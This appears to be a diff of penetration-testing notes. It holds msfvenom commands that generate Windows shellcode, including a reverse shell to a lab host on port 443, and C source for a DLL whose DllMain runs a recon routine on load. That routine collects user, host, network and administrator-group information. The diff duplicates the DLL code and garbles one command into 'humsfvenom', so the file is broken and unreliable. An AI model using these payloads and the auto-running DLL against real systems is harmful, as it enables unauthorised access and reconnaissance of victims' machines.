@@ -1,4 +1,4 @@
-msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00' | grep -o '\\x[0-9a-fA-F]\{2\}' | tr -d '\n'
+humsfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00' | grep -o '\\x[0-9a-fA-F]\{2\}' | tr -d '\n'
 
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_LAB_IP LPORT=443 -f c -b '\x00' | grep -o '\\x[0-9a-fA-F]\{2\}' | tr -d '\n'
@@ -32,6 +32,53 @@ void RunRecon() {
 
     fprintf(f, "\n=== Recon Completed ===\n");
     fclose(f);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        RunRecon();
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+
+void RunRecon() {
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    strcat(tempPath, "p3_recon.txt");
+
+    FILE* f = fopen(tempPath, "w");
+    if (!f) return;
+
+    fprintf(f, "=== P3 DLL Recon Results ===\n\n");
+    fclose(f);
+
+    // Run exploratory commands and append to the file
+    system("whoami >> %TEMP%\\p3_recon.txt");
+    system("hostname >> %TEMP%\\p3_recon.txt");
+    system("ipconfig /all >> %TEMP%\\p3_recon.txt");
+    system("systeminfo >> %TEMP%\\p3_recon.txt");
+    system("net user >> %TEMP%\\p3_recon.txt");
+    system("net localgroup administrators >> %TEMP%\\p3_recon.txt");
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
